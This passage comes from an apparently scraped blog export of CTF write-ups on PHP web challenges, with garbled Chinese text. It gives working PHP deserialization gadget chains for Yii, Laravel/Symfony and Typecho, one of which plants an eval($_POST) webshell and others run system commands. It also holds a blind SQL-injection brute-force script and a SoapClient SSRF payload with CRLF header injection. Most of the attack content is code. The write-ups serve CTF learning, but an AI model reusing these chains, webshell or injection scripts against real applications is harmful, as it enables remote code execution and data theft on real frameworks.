die(&quot;you die&quot;);&#125;if(strlen($a)&gt;33)&#123; die(&quot;nonono.&quot;);&#125;fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?&gt; ä¼šå°†è¾“å…¥çš„ä¸œè¥¿å†™å…¥hack.php å®¡è®¡æºç å¯ä»¥å‘ç°å†™å…¥å†…å®¹ä¼šè¢«å†™å…¥åˆ°hack.phpç›´æ¥å†™å…¥?&gt;&lt;?php phpinfo(); //è®¿é—®hack.phpï¼Œæœç´¢flagå³å¯ ä¸çŸ¥é“æ˜¯ä¸æ˜¯éé¢„æœŸï¼Œflagç›´æ¥åœ¨ç¯å¢ƒé‡Œé¢äº† = = frameworkç®€å•ååºåˆ—åŒ– 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;assert&#x27;; $this-&gt;id = &#x27;file_put_contents(\\&#x27;1.php\\&#x27;,&quot;&lt;?php eval(\\$_POST[0]);&quot;)&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;render&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Faker\\Generator; class See&#123; protected $description; public function __construct() &#123; $this-&gt;description = new Generator(); &#125; &#125;&#125;namespace&#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache&#123; private $keys = []; private $path; public function __construct() &#123; $this-&gt;path = new See; $this-&gt;keys = array( &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;) ); &#125; &#125; // ç”Ÿæˆpoc echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125;?&gt; å†™å…¥ä¹‹åæ‰§è¡Œphpinfoå‘ç°banæ‰å¾ˆå¤šå‡½æ•°ï¼Œåˆ©ç”¨èšå‰‘çš„disable_function ç›´æ¥ç»•è¿‡å³å¯å¾—åˆ°flag websitemanageråœ¨image.php ä¸‹é¢ç›´æ¥æ³¨å…¥ 12345678910111213141516171819202122import requests, string, sysurl = &quot;http://eci-2ze56uon9iidhta1za8c.cloudeci1.ichunqiu.com/image.php&quot;flag = &quot;&quot;for i in range(1, 999): # for j in stringlist: for j in range(40, 126): # sql = &quot;1=(ord(substr(database(),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j) # sql = &quot;1=(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j) sql = &quot;1=(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format( i, j) sql = &quot;1=(ord(substr((select(group_concat(password))from(users)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j) data = &#123;&quot;id&quot;: sql&#125; res = requests.get(url=url, params=data) # print(data) if len(res.text) &gt; 20000: print(j) flag += chr(j-1) print(flag) break if j == 125: sys.exit() å¼±æ™ºçš„ssrf","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"fatååºåˆ—åŒ–æŒ–æ˜","slug":"fatååºåˆ—åŒ–æŒ–æ˜","date":"2021-05-08T13:14:04.000Z","updated":"2021-05-08T13:22:30.833Z","comments":true,"path":"2021/05/08/fatååºåˆ—åŒ–æŒ–æ˜/","link":"","permalink":"http://example.com/2021/05/08/fat%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8C%96%E6%8E%98/","excerpt":"","text":"è‡ªå·±å¤ç°äº†å¥½å‡ ä¸ªååºåˆ—åŒ–çš„æ¡†æ¶æ¼æ´äº†ï¼Œè‡ªå·±æ‰¾ä¸ªæ¡†æ¶ç»ƒç»ƒæ‰‹ï¼Œæ‹¿fatæ¡†æ¶é‡Œ 12unserialize($_GET[0]);$f3-&gt;run(); éšä¾¿æ·»åŠ ä¸€äº›","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"thinkphp5.1","slug":"thinkphp5-1","date":"2021-05-04T05:05:23.000Z","updated":"2021-05-04T08:17:02.176Z","comments":true,"path":"2021/05/04/thinkphp5-1/","link":"","permalink":"http://example.com/2021/05/04/thinkphp5-1/","excerpt":"","text":"æ„Ÿè§‰è‡ªå·±ä¹‹å‰å†™çš„æ–‡ç« ç†è§£è¿˜æ˜¯ä¸å¤Ÿï¼Œæ‰€ä»¥åˆæ¥å†™å¦‚æœåªæ˜¯å•çº¯çš„å¤ç°å¾ˆå¿«å°±ä¼šå¿˜æ‰ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±å¤šé è‡ªå·±å†æ¥å¤ç°ï¼Œè¿™æ¬¡æ˜¯åšn1bookä¸Šçš„å“ªä¸ªthinkphp5.1. æ‰¾å…¥å£èƒ½å¤Ÿæ‰¾åˆ°windows.php æ‰¾åˆ°removeFileï¼Œçœ‹ ç„¶åå‘ç°ä»»æ„æ–‡ä»¶åˆ é™¤ï¼Œç„¶è€Œæˆ‘ä»¬ä¸ä»…ä»…æƒ³è¦åšåˆ°è¿™ä¸ªï¼Œæƒ³æƒ³file_existsèƒ½å¤Ÿåšä»€ä¹ˆå‘¢ï¼Ÿå¯¹å§ï¼Œè¿˜å¯ä»¥æ‰¾toStringæ¥ç»§ç»­çœ‹ï¼ŒæŒ¨ä¸ªæ‰¾ï¼ˆè¿™é‡Œæˆ‘åªèƒ½è¯´æä¾›æ€è·¯ç»™å¤§å®¶ï¼Œå› ä¸ºæ‰¾è¿™ä¸ªæ˜¯ç›¸å½“çš„ç¹çå’Œç–²æƒ«çš„äº‹æƒ…ï¼Œå¦‚æœæŒ‰ç…§ç½‘ä¸Šçš„WPçš„è¯å°±å¾ˆå¿«ï¼Œä½†æ˜¯å¾€å¾€æ‰¾POPé“¾å°±æ˜¯å¾ˆç´¯ï¼‰ï¼Œæœ€ç»ˆèƒ½å¤Ÿé”å®šConversion.php è·Ÿè¿‡å» å†è·Ÿè¿‡å»çœ‹toArrayã€‚å°†æš‚æ—¶æ²¡ç”¨çš„ä»£ç æŠ˜å æ‰ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª$relation-&gt;visiible åˆ†æè¿™æ®µä»£ç åšçš„äº‹æƒ…ï¼š é¦–å…ˆé‡ç‚¹çœ‹çœ‹æ˜¯å¦å¯æ§ï¼Œé¦–å…ˆ$nameæ˜¯å¯æ§çš„ï¼Œ$nameæ¥è‡ªäº$this-&gt;appendçš„æ•°ç»„éå†ï¼Œè€Œè¯¥å‚æ•°æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œæ•…å®Œå…¨å¯æ§ $relation = $this-&gt;getAttr($key)ï¼Œä¸ºæ­¤æˆ‘ä»¬éœ€è¦ä¿è¯$this-&gt;getRelation($key)è¿”å›çš„å†…å®¹ä¸ºç©º æ»¡è¶³è¿™äº›æ¡ä»¶å°±å¯ä»¥è¿›å…¥$relation-&gt;visible($name),è€Œnameä¹Ÿå¯ä»¥æ§åˆ¶ï¼Œnameæ­¤æ—¶ä¼ è¿›å»çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…¨å±€æœç´¢visibleæ–¹æ³•ï¼Œå¦‚æœä¸è¡Œå°±æ‰¾callæ–¹æ³• è¿™é‡Œå…ˆä¸¾å‡ºå…¶ä»–callæ–¹æ³•ä¸ºä»€ä¹ˆä¸ç”¨ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥å…ˆæ‰¾åˆ°ä¸€ä¸ªCache.php è¿™é‡Œçš„ç¬¬ä¸€ä¸ªå‚æ•°å°±ä¸å¯æ§ï¼Œå…¶ä»–çš„å¾ˆå¤šcallå‡½æ•°ä¹Ÿæ˜¯ç±»ä¼¼ æœ€ç»ˆæˆ‘ä»¬å¯ä»¥åœ¨Request.phpä¸‹æ‰¾åˆ° hookå®Œå…¨å¯æ§ï¼Œé‚£ä¹ˆæœ€ç»ˆæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œsystemå‘½ä»¤äº†(åŸæœ¬æˆ‘æ˜¯è¿™æ ·æƒ³çš„ï¼Œç»“æœè¿™å°±å°¼ç›æ˜¯å‰é¢çš„ä¸€å°éƒ¨åˆ†ï¼Œå› ä¸ºè¿™ä¸ªè¯¥æ­»çš„array_unshift)ï¼Œè®©è¿™ä¸ªé“¾å­é•¿äº†ä¸€å€å¤šï¼","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"ciscnlaravel","slug":"ciscnlaravel","date":"2021-05-03T08:40:34.000Z","updated":"2021-05-08T03:52:54.089Z","comments":true,"path":"2021/05/03/ciscnlaravel/","link":"","permalink":"http://example.com/2021/05/03/ciscnlaravel/","excerpt":"","text":"æ€è·¯ï¼šä¸¤ä¸ªexpï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace Symfony\\Component\\Cache\\Adapter&#123; use Symfony\\Component\\Cache\\CacheItem; use Symfony\\Component\\Cache\\Traits\\ProxyTrait; use Symfony\\Component\\Cache\\Traits\\PhpArrayTrait; class TagAwareAdapter&#123; use ProxyTrait; private $deferred ; public function __construct($pool) &#123; $this-&gt;pool = $pool; $this-&gt;deferred = [&quot;exp&quot;=&gt;new CacheItem()]; &#125; &#125; class PhpArrayAdapter&#123; use PhpArrayTrait; &#125;&#125;namespace Symfony\\Component\\Cache\\Traits&#123; trait ProxyTrait&#123; private $pool; &#125; trait PhpArrayTrait&#123; private $values = null; private $file = &quot;/flag&quot;; &#125;&#125;namespace Symfony\\Component\\Cache&#123; final class CacheItem&#123; &#125;&#125;namespace &#123; use Symfony\\Component\\Cache\\Adapter\\PhpArrayAdapter; use Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter; $phpArray = new PhpArrayAdapter(); $Tagwa = new TagAwareAdapter($phpArray); echo urlencode(serialize($Tagwa));&#125; è¿™ä¸ªæ˜¯åŒ…å«çš„ï¼Œä¹Ÿæ˜¯å¸‚é¢ä¸Šå¤§éƒ¨åˆ†çš„ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpnamespace Symfony\\Component\\Cache\\Adapter&#123; use Symfony\\Component\\Cache\\CacheItem; use Symfony\\Component\\Cache\\Traits\\ProxyTrait; use Symfony\\Component\\Ldap\\Adapter\\ExtLdap\\Adapter; class TagAwareAdapter&#123; use ProxyTrait; private $deferred = []; public function __construct($pool) &#123; $this-&gt;pool = $pool; $this-&gt;deferred = [&quot;ex&quot;=&gt;new CacheItem()]; &#125; &#125; class ProxyAdapter&#123; use ProxyTrait; private $setInnerItem=&quot;system&quot;; &#125;&#125;namespace Symfony\\Component\\Cache\\Traits&#123; use Faker\\DefaultGenerator; trait ProxyTrait&#123; private $pool; private $namespace = &quot;whoami&quot;; public function __construct() &#123; $this-&gt;pool = new DefaultGenerator(); &#125; &#125;&#125;namespace Symfony\\Component\\Cache&#123; final class CacheItem&#123;&#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default = &quot;cat /flag&quot;; &#125;&#125;namespace &#123; use Symfony\\Component\\Cache\\Adapter\\ProxyAdapter; use Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter; $pool = new ProxyAdapter(); $tag = new TagAwareAdapter($pool); echo urlencode(serialize($tag));&#125; åŒ…å«çš„è¢«äººè®²çƒ‚äº†ï¼Œè¿™é‡Œè¯´è¯´å‘½ä»¤æ‰§è¡Œçš„è¿™æ¡é“¾ã€‚ å…¨å±€æœç´¢destructï¼Œèƒ½å¤Ÿæ‰¾åˆ° è·Ÿè¿›è¿‡å»å¾ˆå¿«å°±å¯ä»¥æ‰¾åˆ° ç„¶åå‘ç°è°ƒç”¨äº†ä¸€ä¸ªsaveDeferredæ–¹æ³•ï¼Œå…¨å±€æœç´¢saveDeferredï¼š æ‰¾åˆ°ProxyAdapterç±» è·Ÿè¿›doSaveæ–¹æ³• è¿™é‡Œèƒ½å¤Ÿå‘ç°å¾ˆå¤šå‘½ä»¤æ‰§è¡Œçš„ç‚¹ï¼Œä½†æ˜¯å…¶å®æœ€ç»ˆè½åˆ°çš„åœ°æ–¹æ˜¯ 1($this-&gt;setInnerItem)($innerItem, $item); å…ˆè¯´ä¸‹è¸©å¾—å‘ã€‚ä¸€å¼€å§‹æˆ‘ä¸€ç›´åœ¨æ‰¾ï¼š 1$innerItem = $f($this-&gt;namespace.$item[&quot;\\0*\\0key&quot;], null); ä½†æ˜¯è¿™æ ·ä¼šé‡è§ä¸€ä¸ªé—®é¢˜ï¼Œsystem ç¬¬äºŒä¸ªå‚æ•°å¦‚æœè®¾ç½®ä¸ºnullï¼Œåˆ™ä¸ä¼šå›æ˜¾å†…å®¹.. è¿™æ · è€Œæˆ‘ä»¬å¯ä»¥çœ‹è§è¿™æ¡è¯­å¥çš„ç¬¬äºŒä¸ªå‚æ•°å·²ç»é”æ­»ä¸ºnulläº†ï¼Œæ‰€ä»¥æ— è®ºå¦‚ä½•éƒ½æ˜¯æ²¡åŠæ³•æ‰§è¡Œsystemçš„ã€‚ ä½†æ˜¯åæ¥æƒ³åˆ°å…¶å®å¯ä»¥ç”¨assert 1assert(&quot;system(&#x27;dir&#x27;);&quot;,null);","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"http://example.com/tags/Laravel/"}]},{"title":"Ezpop_Revenge","slug":"Ezpop-Revenge","date":"2021-05-02T08:47:22.000Z","updated":"2021-05-02T09:00:02.737Z","comments":true,"path":"2021/05/02/Ezpop-Revenge/","link":"","permalink":"http://example.com/2021/05/02/Ezpop-Revenge/","excerpt":"","text":"åŸæœ¬ä»¥ä¸ºæ˜¯æŒ–dayçš„é¢˜ç›®ï¼Œæ²¡æƒ³åˆ°å‡ºå¥‡çš„æ¯”è¾ƒç®€å•.. çŸ¥è¯†ç‚¹ï¼šSoapClientè¿™é¢˜ç›®éœ€è¦åˆ©ç”¨åˆ°åŸç”Ÿç±»SoapClient è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶ä¸”åˆ°è¯¥ç±»è°ƒç”¨callæ–¹æ³•çš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨å»è®¿é—®æŒ‡å®šçš„url 1https:&#x2F;&#x2F;www.btis.site&#x2F;2020&#x2F;07&#x2F;13&#x2F;SoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&#x2F;#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9A è¯¥ç±»æ— æ³•æºå¸¦è‡ªå·±çš„cookiesï¼Œä½†æ˜¯æˆ‘ä»¬é€šè¿‡CRLFä¾¿å¯ä»¥æˆåŠŸçš„æ§åˆ¶äº†ï¼Œç»™å‡ºçš„payloadå¦‚ä¸‹ï¼š åˆ©ç”¨ä»£ç  1234567&lt;?php$target = &quot;http://127.0.0.1/flag.php&quot;;$attack = new SoapClient(null, array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;btis\\r\\nCookie: PHPSESSID=ctrmmddufre6nph5908ajosbo7\\r\\n&quot;, &#x27;uri&#x27; =&gt; &quot;123&quot;));$payload = urlencode(serialize($attack));echo $payload; æ€è·¯å…ˆæ‰¾èƒ½å¤Ÿè¾“å…¥çš„åœ°æ–¹ï¼Œå…¨å±€æœç´¢unserialize,åœ¨Pluginä¸­æ‰¾åˆ°.. å†ä¹‹åå‘ç°å‡ºé¢˜äººè‡ªå®šä¹‰çš„å†™äº†ä¸€ä¸ªç±»ï¼Œ 1234567class HelloWorld_DB&#123; private $flag=&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;; private $coincidence; function __wakeup()&#123; $db = new Typecho_Db($this-&gt;coincidence[&#x27;hello&#x27;], $this-&gt;coincidence[&#x27;world&#x27;]); &#125;&#125; è‚¯å®šæœ‰ç”¨ï¼Œè·Ÿè¿‡å»çœ‹çœ‹Tyecho_Dbç±»ã€‚ 1234567891011 public function __construct($adapterName, $prefix = &#x27;typecho_&#x27;) &#123; /** è·å–é€‚é…å™¨åç§° */ $this-&gt;_adapterName = $adapterName; /** æ•°æ®åº“é€‚é…å™¨ */ $adapterName = &#x27;Typecho_Db_Adapter_&#x27; . $adapterName;#TODO: ç»™å‡ºæç¤º if (!call_user_func(array($adapterName, &#x27;isAvailable&#x27;))) &#123; throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);//__toString() &#125; å‘ç°è®©æˆ‘ä»¬æ‰¾ä¸€ä¸ª__toStringï¼Œå…¨å±€æœç´¢ æŒ¨ä¸ªæ‰¾ï¼ŒFeedçš„æ²¡å•¥ç”¨ï¼Œæ²¡æœ‰èƒ½å¤Ÿè°ƒç”¨callçš„åœ°æ–¹ï¼Œconfigçš„æ›´æ²¡ç”¨äº†ï¼Œï¼Œçœ‹åˆ°Query.phpé‡Œé¢çš„ 123456switch ($this-&gt;_sqlPreBuild[&#x27;action&#x27;]) &#123; case Typecho_Db::SELECT: return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild); case Typecho_Db::INSERT: return &#x27;INSERT INTO &#x27; . $this-&gt;_sqlPreBuild[&#x27;table&#x27;] è¿™é‡Œçœ‹çœ‹adapteræ˜¯å¦å¯æ§ï¼Œè·Ÿè½¬ä¹‹åå°±ä¼šå‘ç°è¯¥å±æ€§å®Œå…¨å¯æ§ï¼Œé‚£ä¹ˆæ¥ç€æ§åˆ¶_adapter ä½soapClientç±»å³å¯ã€‚ æ‹¼å‡‘payloadï¼š ssrfçš„ä»£ç å€Ÿé‰´äº†y1ngå¸ˆå‚…çš„ã€‚ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpclass HelloWorld_DB&#123; private $coincidence; function __construct() &#123; $this-&gt;coincidence[&#x27;hello&#x27;] = new Typecho_Db_Query(); &#125; function __wakeup()&#123; $db = new Typecho_Db($this-&gt;coincidence[&#x27;hello&#x27;], $this-&gt;coincidence[&#x27;world&#x27;]); &#125;&#125;class Typecho_Db_Query&#123; private $_adapter; private $_sqlPreBuild; function __construct()&#123; $target = &quot;http://127.0.0.1/flag.php&quot;; $post_string = &#x27;admin=&amp;ip=111.111.111.111&amp;port=1111&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#x27;. &quot;\\r\\n&quot;; $headers = [ &#x27;X-Forwarded-For:127.0.0.1&#x27;, &quot;Cookie: PHPSESSID=s8fo8ma30gbttqvgdbb48k6rm4&quot; ]; $this-&gt;_adapter = new SoapClient(null, array(&#x27;uri&#x27; =&gt; &#x27;aaab&#x27;, &#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &#x27;Y1ng^^&#x27; . join(&#x27;^^&#x27;, $headers))); $this-&gt;_sqlPreBuild[&#x27;action&#x27;]= &#x27;SELECT&#x27;; &#125;&#125;function decorate($str)&#123; $arr = explode(&#x27;:&#x27;, $str); $newstr = &#x27;&#x27;; for ($i = 0; $i &lt; count($arr); $i++) &#123; if (preg_match(&#x27;/00/&#x27;, $arr[$i])) &#123; $arr[$i - 2] = preg_replace(&#x27;/s/&#x27;, &quot;S&quot;, $arr[$i - 2]); &#125; &#125; $i = 0; for (; $i &lt; count($arr) - 1; $i++) &#123; $newstr .= $arr[$i]; $newstr .= &quot;:&quot;; &#125; $newstr .= $arr[$i]; return $newstr;&#125;$y1ng = serialize(new HelloWorld_DB());$y1ng = preg_replace(&quot; /\\^\\^/&quot;, &quot;\\r\\n&quot;, $y1ng);$urlen = urlencode($y1ng);$urlen = preg_replace(&#x27;/%00/&#x27;, &#x27;%5c%30%30&#x27;, $urlen);$y1ng = decorate(urldecode($urlen));echo base64_encode($y1ng); æ ¹æ®flag.phpï¼Œæœ€ç»ˆç»“æœè¢«æ‰“å°åˆ°äº†$sessioné‡Œé¢æ‰€ä»¥æˆ‘ä»¬è¦ç©¿è‡ªå·±çš„sesionè¿‡å» 123456&lt;?phpif(!isset($_SESSION)) session_start();if($_SERVER[&#x27;REMOTE_ADDR&#x27;]===&quot;127.0.0.1&quot;)&#123; $_SESSION[&#x27;flag&#x27;]= &quot;MRCTF&#123;******&#125;&quot;;&#125;else echo &quot;æˆ‘æ‰Œyour problem?\\nonly localhost can get flag!&quot;;?&gt;","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"web5","slug":"web5","date":"2021-05-01T13:41:06.000Z","updated":"2021-05-01T13:56:11.199Z","comments":true,"path":"2021/05/01/web5/","link":"","permalink":"http://example.com/2021/05/01/web5/","excerpt":"","text":"æ²¡æƒ³åˆ°ååºåˆ—åŒ–è¿˜å¯ä»¥è¿™æ ·æ“ä½œï¼Œå­¦ä¹ åˆ°äº†å¥¥ å¼€å±€èƒ½æ‰¾å‡ºæºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345&lt;?phpsession_start();ini_set(&#x27;max_execution_time&#x27;, &#x27;5&#x27;);set_time_limit(5);$status = &quot;new&quot;;$cmd = &quot;whoami&quot;;$is_upload = false;$is_unser_finished = false;$iscc_file = NULL;class ISCC_Upload &#123; function __wakeup() &#123; global $cmd; global $is_upload; $cmd = &quot;whoami&quot;; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = (count($_FILES) &gt; 0); &#125; function __destruct() &#123; global $is_upload; global $status; global $iscc_file; $status = &quot;upload_fail&quot;; if ($is_upload) &#123; foreach ($_FILES as $key =&gt; $value) $GLOBALS[$key] = $value; if(is_uploaded_file($iscc_file[&#x27;tmp_name&#x27;])) &#123; $check = @getimagesize($iscc_file[&quot;tmp_name&quot;]); if($check !== false) &#123; $target_dir = &quot;/var/tmp/&quot;; $target_file = $target_dir . randstr(10); if (file_exists($target_file)) &#123; echo &quot;æƒ³å•¥å‘¢ï¼Ÿæœ‰ä¸œè¥¿äº†â€¦â€¦&lt;br&gt;&quot;; finalize(); exit; &#125; if ($iscc_file[&quot;size&quot;] &gt; 500000) &#123; echo &quot;ä¸œè¥¿å¡ä¸è¿›å»~&lt;br&gt;&quot;; finalize(); exit; &#125; if (move_uploaded_file($iscc_file[&quot;tmp_name&quot;], $target_file)) &#123; echo &quot;æˆ‘æ‹¿åˆ°äº†ï¼&lt;br&gt;&quot;; $iscc_file = $target_file; $status = &quot;upload_ok&quot;; &#125; else &#123; echo &quot;æ‹¿ä¸åˆ°:(&lt;br&gt;&quot;; finalize(); exit; &#125; &#125; else &#123; finalize(); exit; &#125; &#125; else &#123; echo &quot;ä½ çœŸæ˜¯ä¸ªå¤©æ‰!&lt;br&gt;&quot;; finalize(); exit; &#125; &#125; &#125;&#125;class ISCC_ResetCMD &#123; protected $new_cmd = &quot;echo &#x27;æ–°æ–°ä¸–ç•Œï¼Œå‘å·æ–½ä»¤!&#x27;&quot;; function __wakeup() &#123; global $cmd; global $is_upload; global $status; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = false; if(!isset($this-&gt;new_cmd)) &#123; $status = &quot;error&quot;; $error = &quot;ä½ è¿™ç½å­æ˜¯ç©ºçš„!&quot;; throw new Exception($error); &#125; if(!is_string($this-&gt;new_cmd)) &#123; $status = &quot;error&quot;; $error = &#x27;ä¸œè¥¿éƒ½æ²¡ç»™å¯¹!&#x27;; throw new Exception($error); &#125; &#125; function __destruct() &#123; global $cmd; global $status; $status = &quot;reset&quot;; if($_SESSION[&#x27;name&#x27;] === &#x27;isccIsCciScc1scc&#x27;) &#123; $cmd = $this-&gt;new_cmd; &#125; &#125;&#125;class ISCC_Login &#123; function __wakeup() &#123; $this-&gt;login(); &#125; function __destruct() &#123; $this-&gt;logout(); &#125; function login() &#123; $flag = file_get_contents(&quot;/flag&quot;); $pAssM0rd = hash(&quot;sha256&quot;, $flag); if($_GET[&#x27;pAssM0rd&#x27;] === $pAssM0rd) $_SESSION[&#x27;name&#x27;] = &quot;isccIsCciScc1scc&quot;; &#125; function logout() &#123; global $status; unset($_SESSION[&#x27;name&#x27;]); $status = &quot;finish&quot;; &#125;&#125;class ISCC_TellMeTruth &#123; function __wakeup() &#123; if(!isset($_SESSION[&#x27;name&#x27;])) $_SESSION[&#x27;name&#x27;] = randstr(14); echo &quot;ä¼¼ä¹è¿™ä¸ª &quot;.$_SESSION[&#x27;name&#x27;].&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;; &#125; function __destruct() &#123; echo &quot;ä¼¼ä¹è¿™ä¸ª &quot;.$_SESSION[&#x27;name&#x27;].&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;; &#125;&#125;class ISCC_Command &#123; function __wakeup() &#123; global $cmd; global $is_upload; $_SESSION[&#x27;name&#x27;] = randstr(14); $is_upload = false; $cmd = &quot;whoami&quot;; &#125; function __toString() &#123; global $cmd; return &quot;çœ‹çœ‹ä½ å¹²çš„å¥½äº‹: &#123;$cmd&#125; &lt;br&gt;&quot;; &#125; function __destruct() &#123; global $cmd; global $status; global $is_unser_finished; $status = &quot;cmd&quot;; if($is_unser_finished === true) &#123; echo &quot;çœ‹çœ‹ä½ å¹²çš„ [&lt;span style=&#x27;color:red&#x27;&gt;&#123;$cmd&#125;&lt;/span&gt;] å¼„å‡ºäº†ä»€ä¹ˆåæœ: &quot;; echo &quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;; @system($cmd); echo &quot;&lt;/span&gt;&quot;; &#125; &#125;&#125;function randstr($len)&#123; $characters = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;; $randstring = &#x27;&#x27;; for ($i = 0; $i &lt; $len; $i++) &#123; $randstring .= $characters[rand(0, strlen($characters))]; &#125; return $randstring;&#125;function waf($s) &#123; if(stripos($s, &quot;*&quot;) !== FALSE) return false; return true;&#125;function finalize() &#123; $cmd = &quot;&quot;; $is_upload = false; unset($_SESSION); @unlink($iscc_file); $status = &quot;finish&quot;; echo &quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;;&#125;if(isset($_GET[&#x27;whatareyounongshane&#x27;])) &#123; $whatareyounongshane = $_GET[&#x27;whatareyounongshane&#x27;]; switch ($whatareyounongshane) &#123; case &quot;src&quot;: highlight_file(__FILE__); break; case &quot;cmd&quot;: echo &quot;æƒ³è¶Šçº§å¹²å¥½äº‹ï¼Ÿè¿˜æ˜¯æœ‰é—¨çš„â€¦â€¦&quot;; header(&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;); break; case &quot;reset&quot;: echo &quot;å‡ è¾ˆå­ç§¯ç´¯çš„å¥½è¿å°±åœ¨è¿™æ—¶~:p&quot;; header(&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;); break; case &quot;upload&quot;: $resp = &lt;&lt;&lt;EOF&lt;form action=&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;iscc_file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;EOF; echo $resp; break; case &quot;tellmetruth&quot;: echo base64_decode(&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;); header(&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;); break; default: echo &quot;ç©ºç©ºå¦‚ä¹Ÿå°±æ˜¯æˆ‘ï¼&quot;; &#125; finalize(); 